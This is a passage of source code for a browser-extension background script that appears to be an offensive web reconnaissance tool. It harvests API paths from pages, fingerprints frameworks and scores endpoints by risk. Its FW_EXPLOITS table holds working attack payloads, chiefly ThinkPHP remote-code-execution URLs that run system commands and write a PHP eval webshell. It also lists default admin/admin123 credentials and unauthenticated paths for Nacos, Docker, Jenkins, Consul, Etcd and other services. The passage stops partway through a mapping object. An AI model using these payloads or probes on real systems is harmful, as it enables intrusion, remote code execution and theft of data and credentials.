// ============================================================
// Background — 被动收集+Fuzz+Badge
// ============================================================

// === 内联定义(Service Worker中importScripts有兼容问题) ===
class SvAPIFilter {
  extract(text) {
    // 与 filters/api-filter.js 完全一致的 6-pattern 提取逻辑
    if (!text||text.length<50) return []
    const found=new Set()
    const isStatic=p=>/\.(woff2?|ttf|eot|otf|jpe?g|png|gif|svg|webp|ico|bmp|jsx?|tsx?|vue|mjs|cjs|css|scss|sass|less|mp[34]|avi|mov|wmv|flv|webm|mkv|mp3|wav|ogg|pdf|docx?|xlsx?|pptx?|txt|md|csv)(\?.*)?$/i.test(p)
    let m
    // P1: LinkFinder/JSFinder absolute+relative paths
    const re1=/["'`]((?:\/|\.\.\/|\.\/)[^"'><,;|(){}\[\]\s]{1,200})["'`]/g
    while((m=re1.exec(text))!==null){const p=m[1];if(p.startsWith('/')&&p.length>=2&&!isStatic(p))found.add(p);else if(p.startsWith('.')&&p.length>=4&&!/\.(?:js|css|less|scss|png|jpg|gif|svg)$/i.test(p))found.add(p)}
    // P2: JSFinder Group4 relative resources with extensions
    const re2=/["'`]([a-zA-Z0-9_\-\.\/]{3,}\.(?:[a-zA-Z]{1,4}|action|do|jspa)(?:\?[^"'`]{0,})?)["'`]/g
    while((m=re2.exec(text))!==null)found.add(m[1])
    // P3: incomplete path (xx/yy → /xx/yy)
    const re3=/["'`]([a-zA-Z][\w\/\.\-]{3,150})["'`]/g
    while((m=re3.exec(text))!==null){const p=m[1];if(p.includes('/')&&!isStatic('/'+p)&&!/^https?:\/\//i.test(p))found.add('/'+p)}
    // P4: Vue/React route
    const re4=/(?:path|route|name)\s*:\s*["'`](\/[^"'`]{1,120})["'`]/gi
    while((m=re4.exec(text))!==null){const p=m[1];if(p.length>=2&&!isStatic(p))found.add(p)}
    // P5: dynamic import
    const re5=/(?:import|require)\s*\(\s*["'`](\.[^"'`]{1,120})["'`]\s*\)/g
    while((m=re5.exec(text))!==null){const p=m[1];if(p.length>=4&&!/\.(?:js|css|less|scss|sass|png|jpg|gif|svg)$/i.test(p))found.add(p)}
    // P6: url/base/prefix assignments
    const re6=/(?:url|base|prefix|api|href|action)\s*[:=]\s*["'`](\/[^"'`]{1,120})["'`]/gi
    while((m=re6.exec(text))!==null){const p=m[1];if(p.length>=2&&!isStatic(p))found.add(p)}
    return [...found]
  }
  method(p){const l=p.toLowerCase();if(/\/login|\/register|\/create|\/add|\/save|\/upload|\/submit|\/batch/.test(l))return'POST';if(/\/update|\/edit|\/modify/.test(l))return'PUT';if(/\/delete|\/remove/.test(l))return'DELETE';return'GET'}
  classify(p){const r=[{k:['/actuator','/heapdump','/env','/mappings','/shutdown','/restart','/threaddump','/configprops','/beans','/loggers','/metrics','/sessions'],l:'Actuator端点',r:'CRITICAL'},{k:['/login','/logout','/register','/auth','/token','/oauth','/sso','/signin','/forgot','/password','/captcha','/verify-code'],l:'认证鉴权',r:'HIGH'},{k:['/upload','/file/upload','/image/upload','/avatar/upload','/import'],l:'文件上传',r:'HIGH'},{k:['/admin/','/manage/','/console/','/system/','/monitor/','/dashboard'],l:'管理后台',r:'HIGH'},{k:['/order/','/trade/','/pay/','/payment/','/cart/','/checkout','/invoice','/refund'],l:'交易支付',r:'CRITICAL'},{k:['/user/','/member/','/account/','/profile','/role/','/permission','/org/','/dept/'],l:'用户管理',r:'HIGH'},{k:['/swagger','/api-docs','/doc.html','/openapi','/graphql','/graphiql'],l:'API文档',r:'HIGH'},{k:['/list','/page','/query','/search','/export','/import','/download','/report','/stat','/dict','/data'],l:'数据查询',r:'MEDIUM'},{k:['/create','/add','/save','/update','/edit','/modify','/delete','/remove','/batch','/submit'],l:'数据写入',r:'MEDIUM'},{k:['/health','/info','/ping','/status','/version','/metrics','/ready','/live'],l:'基础设施',r:'MEDIUM'},{k:['/callback','/webhook','/notify','/sync','/third/','/open/','/hook'],l:'第三方对接',r:'MEDIUM'},{k:['/.env','/.git/','/web.config','/elmah.axd','/trace.axd','/phpinfo','/info.php'],l:'敏感文件',r:'CRITICAL'},{k:['/sms','/send-sms','/send-code','/email/send','/mail/send'],l:'消息发送',r:'MEDIUM'},{k:['/bpm','/oa/','/workflow','/approval','/leave','/task'],l:'工作流',r:'MEDIUM'},{k:['/mall/','/product','/spu','/sku','/stock','/crm','/customer'],l:'业务模块',r:'MEDIUM'},{k:['/infra/','/file/','/codegen','/oss','/cos','/minio'],l:'基础设施',r:'MEDIUM'}];for(const x of r){if(x.k.some(k=>p.toLowerCase().includes(k.toLowerCase())))return{label:x.l,risk:x.r}}return{label:'API',risk:'INFO'}}
}

class SvFwDetect {
  detect(text){if(!text)return[];const sigs=[
    {n:'芋道Yudao',k:'yudao',p:'/admin-api',m:['/admin-api/','VITE_GLOB_API_URL_PREFIX','mall.yudao','iocoder','ruoyi']},
    {n:'若依Ruoyi',k:'ruoyi',p:'/',m:['ruoyi','RuoYi','/system/','/monitor/']},
    {n:'Spring Boot',k:'spring',p:'',m:['Whitelabel Error Page','actuator','spring-boot','api-docs','X-Application-Context']},
    {n:'Spring Cloud',k:'springcloud',p:'',m:['spring cloud','gateway','eureka','consul','nacos','sentinel']},
    {n:'ThinkPHP',k:'thinkphp',p:'',m:['thinkphp','ThinkPHP','runtime/log']},
    {n:'Laravel',k:'laravel',p:'/api',m:['csrf-token','laravel','XSRF-TOKEN','laravel_session']},
    {n:'FastAPI',k:'fastapi',p:'/api',m:['fastapi','OpenAPI','/docs','/redoc']},
    {n:'Django',k:'django',p:'/api',m:['csrfmiddlewaretoken','django','X-CSRFToken']},
    {n:'Flask',k:'flask',p:'/api',m:['flask','Werkzeug','jinja2']},
    {n:'ASP.NET',k:'aspnet',p:'',m:['__VIEWSTATE','__EVENTVALIDATION','ASP.NET','IIS','X-AspNet-Version']},
    {n:'Shiro',k:'shiro',p:'',m:['rememberMe=','shiro','org.apache.shiro']},
    {n:'Vue.js',k:'vue',p:'/api',m:['vue','__vue__','pinia','vuex','element-plus','ant-design-vue','nuxt']},
    {n:'React',k:'react',p:'/api',m:['react','react-dom','__INITIAL_STATE__','webpackJsonp','antd','next']},
    {n:'Angular',k:'angular',p:'/api',m:['angular','@angular','ng-version','zone.js']},
    {n:'Next.js',k:'nextjs',p:'/api',m:['_next/','__NEXT_DATA__','next/router']},
    {n:'Webpack',k:'webpack',p:'',m:['webpackJsonp','__webpack_require__','webpack-dev-server','webpackChunk']},
    {n:'Vite',k:'vite',p:'',m:['VITE_GLOB','@vitejs','vite-plugin','import.meta.hot']},
    {n:'ECharts',k:'echarts',p:'',m:['echarts','echarts.init','zrender']},
    {n:'jQuery',k:'jquery',p:'',m:['jQuery','$.ajax','$.get']},
    {n:'Node.js',k:'nodejs',p:'/api',m:['process.env','__dirname','require(','module.exports','Buffer.from']},
    {n:'Jenkins',k:'jenkins',p:'',m:['jenkins','Dashboard [Jenkins]','X-Jenkins','/script','/job/']},
    {n:'Elasticsearch',k:'elasticsearch',p:'',m:['elasticsearch','ES_','/_cat/master','/_search','/_cluster/settings','kibana']},
    {n:'Kibana',k:'kibana',p:'',m:['kibana','kbn-name','kbn-version','.kibana']},
    {n:'Swagger',k:'swagger',p:'',m:['swagger','Swagger','/swagger-ui','/api-docs','OpenAPI','/v2/api-docs']},
    {n:'Docker',k:'docker',p:'',m:['docker','container','/containers/json','/images/json','dockerfile','FROM alpine']},
    {n:'CouchDB',k:'couchdb',p:'',m:['couchdb','/_utils/','Welcome to CouchDB']},
    {n:'Solr',k:'solr',p:'',m:['solr','Apache Solr','/solr/']},
    {n:'Druid',k:'druid',p:'',m:['druid','Druid Console','/druid/','druid.connection']},
    {n:'phpMyAdmin',k:'phpmyadmin',p:'',m:['phpMyAdmin','phpmyadmin','PMA_token']},
    {n:'RabbitMQ',k:'rabbitmq',p:'',m:['rabbitmq','RabbitMQ','/api/','amqp']},
    {n:'MongoDB',k:'mongodb',p:'',m:['mongodb','mongod','mongo','/_admin/']},
    {n:'Hadoop',k:'hadoop',p:'',m:['hadoop','Hadoop','yarn','/ws/v1/','/cluster/']},
    {n:'ZooKeeper',k:'zookeeper',p:'',m:['zookeeper','ZooKeeper','/commands/','/sstz']},
    {n:'ActiveMQ',k:'activemq',p:'',m:['activemq','ActiveMQ','/admin/','/api/']},
    {n:'Zabbix',k:'zabbix',p:'',m:['zabbix','Zabbix','/zabbix/','zbx']},
    {n:'GitLab',k:'gitlab',p:'',m:['gitlab','GitLab','/users/sign_in']},
    {n:'Harbor',k:'harbor',p:'',m:['harbor','Harbor','/api/users']},
    {n:'Grafana',k:'grafana',p:'',m:['grafana','Grafana','/api/datasources','/api/search']},
    {n:'Consul',k:'consul',p:'',m:['consul','Consul','/:8500/','v1/catalog']},
    {n:'Etcd',k:'etcd',p:'',m:['etcd','etcd','/:2379/','/v2/keys']},
    {n:'Istio',k:'istio',p:'',m:['istio','Istio','/15000/','/stats/prometheus']},
    {n:'WordPress',k:'wordpress',p:'',m:['wordpress','wp-content','wp-includes','/wp-admin/','wp-json']},
  ];const r=[];for(const s of sigs){let sc=0;for(const kw of s.m){if(text.includes(kw))sc+=30}if(sc>=60)r.push({name:s.n,key:s.k,prefix:s.p,score:sc})}return r.sort((a,b)=>b.score-a.score)}
  extractConfig(text){const cfg={};const ps=[[/VITE_GLOB_API_URL_PREFIX\s*[:=]\s*["']([^"']+)["']/,'apiPrefix'],[/VITE_GLOB_API_URL\s*[:=]\s*["']([^"']+)["']/,'apiUrl'],[/VITE_GLOB_UPLOAD_URL\s*[:=]\s*["']([^"']+)["']/,'uploadUrl'],[/VITE_GLOB_APP_TENANT_ENABLE\s*[:=]\s*["']([^"']+)["']/,'tenant'],[/VITE_GLOB_APP_CAPTCHA_ENABLE\s*[:=]\s*["']([^"']+)["']/,'captcha'],[/restfulUrl\s*[:=]\s*["']([^"']+)["']/,'restfulUrl'],[/api\s*[:=]\s*["']([^"']+)["']/,'apiHost'],[/baseURL\s*[:=]\s*["']([^"']+)["']/,'baseURL']];if(!text)return cfg;for(const[re,k]of ps){const m=text.match(re);if(m)cfg[k]=m[1]}return cfg}
}

class SvFingerprint {
  analyze(body,status){if(!body)return null;const fps=[{re:/"_links"[^}]{0,200}?(?:"actuator"|"heapdump"|"env"[^}]{0,100}?"href")/,t:'Actuator暴露!',r:'CRITICAL'},{re:/Whitelabel Error Page/,t:'Spring错误页',r:'HIGH'},{re:/thinkphp|ThinkPHP/,t:'ThinkPHP报错',r:'CRITICAL'},{re:/SQL syntax|mysql_fetch|SQLSTATE|ORA-/,t:'SQL错误',r:'CRITICAL'},{re:/Sensors Analytics is ready/,t:'神策Debug',r:'HIGH'},{re:/please provide valid app/,t:'API网关',r:'MEDIUM'},{re:/valid token is required/,t:'需认证',r:'INFO'},{re:/没有该操作权限|权限不足|access denied|forbidden/,t:'权限不足',r:'MEDIUM'},{re:/参数错误|参数不正确|missing parameter/,t:'参数校验',r:'INFO'},{re:/系统异常|系统内部错误|internal server error/,t:'服务端异常',r:'MEDIUM'},{re:/Index of \//,t:'目录遍历',r:'MEDIUM'},{re:/\.git\/HEAD|ref: refs\/heads/,t:'Git泄露',r:'CRITICAL'}];for(const fp of fps){if(fp.re.test(body))return{type:fp.t,risk:fp.r}}if(status===200&&body.startsWith('{')&&body.includes('"code":0'))return{type:'JSON成功',risk:'INFO'};if(status===500&&body.length>100)return{type:'500错误',risk:'MEDIUM'};return null}
}

// 框架漏洞利用知识库（攻击路径提示）
const FW_EXPLOITS = {
  thinkphp: { name: 'ThinkPHP', hints: [
    { path: '/?s=_index/ini', type: 'RCE', desc: 'RCE — 加载配置执行PHP代码' },
    { path: '/?s=index/\think\App/runtime', type: 'RCE', desc: 'RCE — think\App 路由调用' },
    { path: '/?s=index/\think\Request/cache&var=1&value=system(whoami)', type: 'RCE', desc: 'RCE — Request缓存写入' },
    { path: '/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami', type: 'RCE', desc: 'RCE — Container函数调用' },
    { path: '/?s=index/\think\view\driver\Php/display&content=<?php system($_GET[1]);?>', type: 'RCE', desc: 'RCE — 视图写入webshell' },
    { path: '/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php @eval($_POST[1]);?>', type: 'RCE', desc: 'RCE — 文件写入' },
    { path: '/runtime/log/', type: 'INFO', desc: '日志目录' },
    { path: '/application/database.php', type: 'INFO', desc: '数据库配置泄露' },
    { path: '/application/config.php', type: 'INFO', desc: '框架配置泄露' },
  ]},
  spring: { name: 'Spring Boot', hints: [
    { path: '/actuator/env', type: 'CRITICAL', desc: '环境变量泄露 — 可能含密钥' },
    { path: '/actuator/heapdump', type: 'CRITICAL', desc: '堆转储 — 下载分析获取凭据' },
    { path: '/actuator/mappings', type: 'HIGH', desc: '完整路由清单' },
    { path: '/actuator/beans', type: 'HIGH', desc: 'Spring Bean列表 — 审计依赖' },
    { path: '/actuator/configprops', type: 'HIGH', desc: '配置属性泄露' },
    { path: '/actuator/threaddump', type: 'MEDIUM', desc: '线程dump — 找敏感操作' },
    { path: '/actuator/loggers', type: 'MEDIUM', desc: '日志级别配置' },
    { path: '/actuator/sessions', type: 'HIGH', desc: 'Spring Session列表' },
    { path: '/actuator/refresh', type: 'MEDIUM', desc: '配置刷新端点' },
    { path: '/jolokia/list', type: 'CRITICAL', desc: 'Jolokia — JNDI注入风险' },
    { path: '/swagger-ui.html', type: 'HIGH', desc: 'Swagger API文档' },
    { path: '/v2/api-docs', type: 'HIGH', desc: 'OpenAPI JSON' },
    { path: '/webjars/swagger-ui/index.html', type: 'HIGH', desc: 'Swagger UI' },
    { path: '/env', type: 'CRITICAL', desc: 'actuator env (同 /actuator/env)' },
    { path: '/heapdump', type: 'CRITICAL', desc: 'actuator heapdump (同 /actuator/heapdump)' },
  ]},
  springcloud: { name: 'Spring Cloud', hints: [
    { path: '/nacos/v1/cs/opss/switches', type: 'CRITICAL', desc: 'Nacos 未授权 — 禁用端点' },
    { path: '/nacos/v1/cs/configs?dataId=nacos.cfg.dataIdmx&group=DEFAULT_GROUP', type: 'CRITICAL', desc: 'Nacos 未授权配置读取' },
    { path: '/nacos/v1/auth/users?pageNo=1&pageSize=100', type: 'CRITICAL', desc: 'Nacos 未授权用户列表' },
    { path: '/gateway/mappings', type: 'HIGH', desc: 'Gateway路由映射' },
    { path: '/gateway/routes', type: 'HIGH', desc: 'Gateway路由配置' },
    { path: '/actuator/gateway/routes', type: 'HIGH', desc: 'Gateway路由端点' },
    { path: '/eureka/**', type: 'MEDIUM', desc: 'Eureka服务发现' },
  ]},
  laravel: { name: 'Laravel', hints: [
    { path: '/.env', type: 'CRITICAL', desc: '环境配置泄露 — 含DB密钥/APP_KEY' },
    { path: '/.env.backup', type: 'CRITICAL', desc: '.env备份泄露' },
    { path: '/storage/logs/laravel.log', type: 'HIGH', desc: 'Laravel日志 — 可能含报错信息' },
    { path: '/vendor/autoload.php', type: 'HIGH', desc: 'Composer依赖泄露' },
    { path: '/config/database.php', type: 'HIGH', desc: '数据库配置' },
    { path: '/config/app.php', type: 'HIGH', desc: '应用配置含密钥' },
    { path: '/_debugbar/open', type: 'HIGH', desc: 'DebugBar存储数据' },
    { path: '/_profiler', type: 'HIGH', desc: 'Symfony Profiler' },
    { path: '/api/user', type: 'MEDIUM', desc: '当前用户信息 (未鉴权)' },
    { path: '/telescope', type: 'HIGH', desc: 'Telescope调试面板' },
    { path: '/horizon', type: 'HIGH', desc: 'Horizon队列监控' },
  ]},
  shiro: { name: 'Apache Shiro', hints: [
    { path: '/login', type: 'HIGH', desc: 'Shiro登录页 — 找rememberMe反序列化' },
    { path: '/admin/index', type: 'HIGH', desc: '后台管理 — rememberMe未禁用则尝试反序列化' },
    { path: 'rememberMe=deleteMe', type: 'INFO', desc: '检测响应头 — 确认使用了Shiro' },
  ]},
  yudao: { name: '芋道 Yudao', hints: [
    { path: '/admin/login', type: 'HIGH', desc: '后台登录 — 尝试验证默认弱口令 admin/admin123' },
    { path: '/generator/genTable', type: 'CRITICAL', desc: '代码生成 — 可生成恶意Java代码' },
    { path: '/codegen/genCode', type: 'CRITICAL', desc: '代码生成RCE — 解压zip路径穿越写入class' },
    { path: '/admin-api/system/config', type: 'HIGH', desc: '系统配置读取' },
    { path: '/dict/data/type/sys_user_status', type: 'INFO', desc: '字典数据 — 枚举用户状态' },
  ]},
  ruoyi: { name: '若依 Ruoyi', hints: [
    { path: '/login', type: 'HIGH', desc: '后台登录 — 尝试验证默认弱口令 admin/admin123' },
    { path: '/user/profile', type: 'MEDIUM', desc: '个人中心 — 可能泄露用户信息' },
    { path: '/getPerTreeUn', type: 'MEDIUM', desc: '获取菜单权限树' },
    { path: '/system/role', type: 'HIGH', desc: '角色管理' },
    { path: '/system/user/authRole/*', type: 'HIGH', desc: '分配用户角色' },
    { path: '/system/menu/list', type: 'HIGH', desc: '菜单列表 — 找敏感接口' },
    { path: '/monitor/online', type: 'MEDIUM', desc: '在线用户' },
    { path: '/monitor/server', type: 'MEDIUM', desc: '服务器信息' },
    { path: '/tool/gen/editTable/*', type: 'HIGH', desc: '代码生成表编辑' },
    { path: '/tool/gen/batchGenCode', type: 'CRITICAL', desc: '批量生成代码 — 尝试RCE' },
  ]},
  fastapi: { name: 'FastAPI', hints: [
    { path: '/docs', type: 'HIGH', desc: 'Swagger UI文档' },
    { path: '/redoc', type: 'HIGH', desc: 'ReDoc文档' },
    { path: '/openapi.json', type: 'HIGH', desc: 'OpenAPI JSON — 完整API定义' },
    { path: '/openapi.yaml', type: 'HIGH', desc: 'OpenAPI YAML' },
    { path: '/api/v1/users', type: 'MEDIUM', desc: '用户接口' },
    { path: '/api/v1/items', type: 'MEDIUM', desc: '物品接口' },
    { path: '/debug/tb', type: 'HIGH', desc: 'Python traceback — 调试信息' },
  ]},
  django: { name: 'Django', hints: [
    { path: '/admin/login/', type: 'HIGH', desc: 'Django管理后台' },
    { path: '/admin/', type: 'HIGH', desc: 'Django Admin' },
    { path: '/static/admin/', type: 'MEDIUM', desc: '管理后台静态文件' },
    { path: '/__debug__/', type: 'HIGH', desc: 'Django Debug模式' },
    { path: '/api/v1/', type: 'MEDIUM', desc: 'REST API端点' },
    { path: '/schema.swagger-ui/', type: 'HIGH', desc: 'Swagger文档' },
    { path: '/swagger.json', type: 'HIGH', desc: 'OpenAPI JSON' },
  ]},
  aspnet: { name: 'ASP.NET', hints: [
    { path: '/elmah.axd', type: 'CRITICAL', desc: 'ELMAH错误日志 — 可能含敏感信息' },
    { path: '/trace.axd', type: 'HIGH', desc: 'ASP.NET跟踪' },
    { path: '/WebResource.axd', type: 'MEDIUM', desc: '嵌入资源' },
    { path: '/ScriptResource.axd', type: 'MEDIUM', desc: '脚本资源' },
    { path: '/Health', type: 'MEDIUM', desc: '健康检查' },
    { path: '/api-docs', type: 'HIGH', desc: 'API文档' },
    { path: '/swagger', type: 'HIGH', desc: 'Swagger UI' },
    { path: '/appsettings.json', type: 'HIGH', desc: '应用配置' },
  ]},
  vue: { name: 'Vue.js', hints: [
    { path: '/api/', type: 'MEDIUM', desc: 'API路径探测 — 尝试/api/admin/*等' },
    { path: '/config/', type: 'HIGH', desc: '前端配置 — VITE_GLOB_API_URL等' },
    { path: '/prod.api.js', type: 'HIGH', desc: 'Webpack打包产物 — 找API路径' },
    { path: '/js/app.', type: 'HIGH', desc: '主bundle — 可能含API地址' },
    { path: '/chunk-vendors.', type: 'MEDIUM', desc: '第三方库bundle' },
  ]},
  nextjs: { name: 'Next.js', hints: [
    { path: '/api/', type: 'HIGH', desc: 'API Routes — 全都试试' },
    { path: '/_next/data/', type: 'HIGH', desc: 'SSR数据端点' },
    { path: '/_next/static/', type: 'MEDIUM', desc: '静态资源' },
    { path: '/api/_next/image', type: 'MEDIUM', desc: '图片优化端点' },
    { path: '/api/auth/', type: 'HIGH', desc: 'Auth API — 找登录/注册' },
    { path: '/api/users/', type: 'HIGH', desc: '用户API' },
  ]},
  fastjson: { name: 'Fastjson', hints: [
    { path: '/', type: 'CRITICAL', desc: '尝试JSON反序列化 — 找未授权接口' },
    { path: '/login', type: 'CRITICAL', desc: '登录接口 — 找反序列化点' },
    { path: '/api/', type: 'CRITICAL', desc: 'API接口 — 抓包分析参数' },
  ]},
  jenkins: { name: 'Jenkins', hints: [
    { path: '/script', type: 'CRITICAL', desc: '未授权 — Groovy脚本执行' },
    { path: '/systemInfo', type: 'HIGH', desc: '系统信息泄露' },
    { path: '/people', type: 'MEDIUM', desc: '用户列表' },
    { path: '/configureSecurity', type: 'HIGH', desc: '安全配置 — 可修改授权策略' },
    { path: '/api/json?tree=jobs[url,name]', type: 'HIGH', desc: 'API — 遍历所有Job' },
  ]},
  elasticsearch: { name: 'Elasticsearch', hints: [
    { path: '/_cat/master', type: 'CRITICAL', desc: '未授权 — 获取Master节点信息' },
    { path: '/_cat/indices', type: 'HIGH', desc: '未授权 — 列出所有索引' },
    { path: '/_search?size=100', type: 'HIGH', desc: '未授权 — 搜索数据' },
    { path: '/_nodes/stats', type: 'HIGH', desc: '节点状态' },
    { path: '/_aliases', type: 'MEDIUM', desc: '索引别名' },
  ]},
  kibana: { name: 'Kibana', hints: [
    { path: '/app/kibana', type: 'MEDIUM', desc: 'Kibana管理界面' },
    { path: '/api/status', type: 'HIGH', desc: 'Kibana状态' },
    { path: '/api/saved_objects/_find', type: 'HIGH', desc: '未授权 — 查找已保存对象' },
    { path: '/app/timelion', type: 'HIGH', desc: 'Timelion时间序列' },
  ]},
  swagger: { name: 'Swagger UI', hints: [
    { path: '/swagger-ui.html', type: 'HIGH', desc: 'Swagger文档 — 找API接口' },
    { path: '/swagger-ui/', type: 'HIGH', desc: 'Swagger文档' },
    { path: '/api-docs', type: 'HIGH', desc: 'OpenAPI JSON' },
    { path: '/v1/api-docs', type: 'HIGH', desc: 'OpenAPI v1' },
    { path: '/v2/api-docs', type: 'HIGH', desc: 'OpenAPI v2' },
  ]},
  docker: { name: 'Docker API', hints: [
    { path: ':2375/version', type: 'CRITICAL', desc: 'Docker未授权 — 远程管理' },
    { path: ':2376/version', type: 'CRITICAL', desc: 'Docker TLS未授权' },
    { path: ':2375/containers/json', type: 'CRITICAL', desc: '列出所有容器' },
    { path: ':2375/images/json', type: 'HIGH', desc: '列出所有镜像' },
    { path: ':2375/volumes', type: 'HIGH', desc: '列出所有卷' },
  ]},
  couchdb: { name: 'CouchDB', hints: [
    { path: '/_utils/', type: 'HIGH', desc: 'CouchDB Web界面' },
    { path: '/_all_dbs', type: 'CRITICAL', desc: '未授权 — 列出所有数据库' },
    { path: '/_session', type: 'HIGH', desc: 'Session信息' },
    { path: '/_user/', type: 'HIGH', desc: '用户数据库' },
  ]},
  solr: { name: 'Apache Solr', hints: [
    { path: '/solr/', type: 'MEDIUM', desc: 'Solr管理界面' },
    { path: '/solr/admin/ping', type: 'HIGH', desc: '健康检查' },
    { path: '/solr/#/core_name/query', type: 'HIGH', desc: 'Solr查询界面' },
    { path: '/solr/core_name/config', type: 'HIGH', desc: '修改配置' },
  ]},
  druid: { name: 'Druid', hints: [
    { path: '/druid/index.html', type: 'CRITICAL', desc: 'Druid监控台 — 未授权访问' },
    { path: '/druid/sql.html', type: 'CRITICAL', desc: 'SQL监控 — 未授权' },
    { path: '/druid/datasource.html', type: 'CRITICAL', desc: '数据源监控' },
    { path: '/druid/weburi-spring.json', type: 'HIGH', desc: 'Spring URI配置' },
    { path: '/druid/api.json', type: 'HIGH', desc: 'API信息' },
  ]},
  phpmyadmin: { name: 'phpMyAdmin', hints: [
    { path: '/phpmyadmin/', type: 'CRITICAL', desc: 'phpMyAdmin — 弱口令/未授权' },
    { path: '/pma/', type: 'CRITICAL', desc: 'phpMyAdmin别名' },
    { path: '/myadmin/', type: 'CRITICAL', desc: 'phpMyAdmin别名' },
    { path: '/phpMyAdmin/', type: 'CRITICAL', desc: 'phpMyAdmin大小写变体' },
  ]},
  rabbitmq: { name: 'RabbitMQ', hints: [
    { path: ':15672/', type: 'CRITICAL', desc: 'RabbitMQ管理界面 — 弱口令/未授权' },
    { path: ':15692/', type: 'CRITICAL', desc: 'RabbitMQ Prometheus指标' },
    { path: ':25672/', type: 'MEDIUM', desc: 'RabbitMQ分布式端口' },
    { path: '/api/nodes', type: 'HIGH', desc: 'API获取节点信息' },
  ]},
  mongodb: { name: 'MongoDB', hints: [
    { path: ':27017/', type: 'CRITICAL', desc: 'MongoDB Web界面' },
    { path: '/_admin/buildinfo', type: 'HIGH', desc: 'MongoDB管理' },
    { path: '/_admin/serversStatus', type: 'HIGH', desc: '服务器状态' },
  ]},
  hadoop: { name: 'Hadoop YARN', hints: [
    { path: ':8088/cluster', type: 'CRITICAL', desc: 'YARN集群管理 — 未授权' },
    { path: ':8088/ws/v1/cluster/apps', type: 'CRITICAL', desc: '列出所有应用' },
    { path: ':8088/cluster/nodes', type: 'HIGH', desc: '节点管理' },
    { path: ':19888/jobhistory', type: 'HIGH', desc: 'Hadoop JobHistory' },
    { path: ':19888/cluster/app', type: 'HIGH', desc: '应用信息' },
  ]},
  zookeeper: { name: 'ZooKeeper', hints: [
    { path: ':2181/', type: 'CRITICAL', desc: 'ZooKeeper未授权 — 远程命令执行' },
    { path: ':2181/commands/stats', type: 'HIGH', desc: 'ZooKeeper统计' },
    { path: ':2181/commands/conf', type: 'HIGH', desc: 'ZooKeeper配置' },
    { path: ':2181/commands/envi', type: 'HIGH', desc: 'ZooKeeper环境' },
    { path: ':2181/commands/srst', type: 'HIGH', desc: 'ZooKeeper状态重置' },
  ]},
  rsync: { name: 'Rsync', hints: [
    { path: ':873/', type: 'CRITICAL', desc: 'Rsync未授权 — 文件同步' },
    { path: 'rsync://target/', type: 'HIGH', desc: '列出Rsync模块' },
  ]},
  ldap: { name: 'LDAP', hints: [
    { path: ':389/', type: 'CRITICAL', desc: 'LDAP未授权 — 目录遍历' },
    { path: ':636/', type: 'CRITICAL', desc: 'LDAPS未授权' },
  ]},
  nfs: { name: 'NFS', hints: [
    { path: ':2049/', type: 'CRITICAL', desc: 'NFS未授权 — 文件共享' },
    { path: ':20048/', type: 'CRITICAL', desc: 'NFS mountd未授权' },
  ]},
  activemq: { name: 'ActiveMQ', hints: [
    { path: ':8161/admin/', type: 'CRITICAL', desc: 'ActiveMQ管理界面 — 弱口令/未授权' },
    { path: ':8161/api/message', type: 'HIGH', desc: '消息队列API' },
    { path: ':61616/', type: 'HIGH', desc: 'ActiveMQ OpenWire' },
  ]},
  zabbix: { name: 'Zabbix', hints: [
    { path: ':10051/zabbix.php', type: 'CRITICAL', desc: 'Zabbix监控 — 弱口令/未授权' },
    { path: '/zabbix/', type: 'CRITICAL', desc: 'Zabbix Web' },
    { path: '/api_jsonrpc.php', type: 'HIGH', desc: 'Zabbix API' },
  ]},
  gitlab: { name: 'GitLab', hints: [
    { path: '/users/sign_in', type: 'MEDIUM', desc: 'GitLab登录页' },
    { path: '/api/v4/projects', type: 'HIGH', desc: 'API — 列出公开项目' },
    { path: '/explore', type: 'HIGH', desc: '探索页 — 公开项目' },
    { path: '/help', type: 'MEDIUM', desc: 'GitLab帮助文档' },
  ]},
  harbor: { name: 'Harbor', hints: [
    { path: '/api/users', type: 'CRITICAL', desc: 'Harbor未授权 — 注册管理员' },
    { path: '/api/v2.0/registries', type: 'HIGH', desc: '列出 registries' },
    { path: '/api/v2.0/projects', type: 'HIGH', desc: '列出项目' },
    { path: '/chartrepo/library/index.yaml', type: 'HIGH', desc: 'Helm charts' },
  ]},
  grafana: { name: 'Grafana', hints: [
    { path: '/api/datasources', type: 'CRITICAL', desc: '未授权 — 数据源信息' },
    { path: '/api/search', type: 'HIGH', desc: '搜索Dashboards' },
    { path: '/api/teams', type: 'HIGH', desc: '团队信息' },
    { path: '/api/org', type: 'HIGH', desc: '组织信息' },
    { path: '/api/plugins', type: 'MEDIUM', desc: '插件列表' },
  ]},
  consul: { name: 'Consul', hints: [
    { path: ':8500/ui/', type: 'CRITICAL', desc: 'Consul Web界面 — 未授权' },
    { path: ':8500/v1/catalog/services', type: 'CRITICAL', desc: '未授权 — 服务目录' },
    { path: ':8500/v1/kv/?recurse', type: 'CRITICAL', desc: '未授权 — KV存储' },
    { path: ':8500/v1/agent/services', type: 'HIGH', desc: 'Agent服务' },
  ]},
  etcd: { name: 'Etcd', hints: [
    { path: ':2379/version', type: 'CRITICAL', desc: 'Etcd版本信息' },
    { path: ':2379/v2/keys/', type: 'CRITICAL', desc: '未授权 — KV存储' },
    { path: ':2379/v3/kv/range', type: 'CRITICAL', desc: 'gRPC KV API' },
    { path: ':2380/', type: 'MEDIUM', desc: 'Etcd Peer通信' },
  ]},
  istio: { name: 'Istio', hints: [
    { path: ':15000/stats/prometheus', type: 'HIGH', desc: 'Envoy统计指标' },
    { path: ':15090/stats/prometheus', type: 'HIGH', desc: 'Envoy Prometheus指标' },
    { path: '/healthz/ready', type: 'MEDIUM', desc: 'Istio健康检查' },
    { path: '/debug', type: 'HIGH', desc: '调试端点' },
  ]},
  wordpress: { name: 'WordPress', hints: [
    { path: '/wp-admin/', type: 'HIGH', desc: 'WordPress后台' },
    { path: '/xmlrpc.php', type: 'HIGH', desc: 'XML-RPC — 爆破/SSRF' },
    { path: '/wp-login.php', type: 'HIGH', desc: 'WordPress登录' },
    { path: '/wp-json/wp/v2/users', type: 'CRITICAL', desc: '未授权 — 用户信息泄露' },
    { path: '/wp-config.php', type: 'CRITICAL', desc: '配置文件泄露' },
  ]},
}

// 框架key到FW_EXPLOITS key的映射
const FW_KEY_MAP = {
  'spring': 'spring', 'springboot': 'spring',
  'springcloud': 'springcloud', 'spring_cloud': 'springcloud',
  'thinkphp': 'thinkphp',
  'laravel': 'laravel',
